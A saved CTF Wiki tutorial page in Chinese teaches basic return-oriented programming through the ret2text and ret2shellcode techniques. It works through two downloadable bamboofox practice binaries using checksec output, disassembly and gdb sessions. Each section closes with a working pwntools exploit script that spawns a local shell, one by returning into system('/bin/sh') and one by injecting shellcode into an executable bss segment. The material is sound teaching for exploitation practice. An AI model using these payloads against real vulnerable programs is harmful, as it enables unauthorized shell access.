---
ingested: true
ingestedAt: 2026-05-15
---
标题: 基本 ROP
来源: https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/
提取方式: WebFetch
内容:
# 基本 ROP

随着 NX (Non-eXecutable) 保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出来相应的方法来绕过保护。

目前被广泛使用的攻击手法是 **返回导向编程**  (Return Oriented Programming)，其主要思想是在 **栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**

gadgets 通常是以 `ret` 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。

返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget &ldquo;执行&rdquo; 了一个新的程序。

使用 ROP 攻击一般得满足如下条件：

- 程序漏洞允许我们劫持控制流，并控制后续的返回地址。

- 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。

作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。

需要注意的是，现代操作系统通常会开启地址随机化保护（ASLR），这意味着 gadgets 在内存中的位置往往是不固定的。但幸运的是其相对于对应段基址的偏移通常是固定的，因此我们在寻找到了合适的 gadgets 之后可以通过其他方式泄漏程序运行环境信息，从而计算出 gadgets 在内存中的真正地址。

## ret2text

### 原理 

ret2text 即控制程序执行程序本身已有的的代码 (即， `.text` 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。

这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。

### 例子 

其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。

点击下载: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text)

首先，查看一下程序的保护机制：

```
➜  ret2text checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&amp;v4);
  printf("Maybe I will tell you next time !");
  return 0;
}
```
可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。接下来查看反汇编代码：

```
.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system
```
在 secure 函数又发现了存在调用 `system("/bin/sh")` 的代码，那么如果我们直接控制程序返回至 `0x0804863A` ，那么就可以得到系统的 shell 了。

下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。

```
.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets
```
可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下：

```
gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?

Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24      gets(buf);
───────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;
```
可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 `esp+0x1c`，因此，我们可以推断：

- s 的地址为 0xffffcd5c

- s 相对于 ebp 的偏移为 0x6c

- s 相对于返回地址的偏移为 0x6c+4

因此最后的 payload 如下：

```
##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline(b'A' * (0x6c + 4) + p32(target))
sh.interactive()
```
## ret2shellcode

### 原理 

ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。**通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码** 。

在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。

需要注意的是，**在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用** 。

### 例子 

这里我们以 bamboofox 中的 ret2shellcode 为例，需要注意的是，你应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。

点击下载: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)

首先检测程序开启的保护：

```
➜  ret2shellcode checksec ret2shellcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。接下来我们再使用 IDA 对程序进行反编译：

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&amp;v4);
  strncpy(buf2, (const char *)&amp;v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```
可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。

```
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
```
这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。

```
gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 

Breakpoint 1, main () at ret2shellcode.c:8
8       setvbuf(stdout, 0LL, 2, 0LL);
─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
      6  int main(void)
      7  {
 →    8      setvbuf(stdout, 0LL, 2, 0LL);
      9      setvbuf(stdin, 0LL, 1, 0LL);
     10  
─────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
```
通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：

```
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
```
那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。

最后的 payload 如下：

```
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
sh.interactive()
```
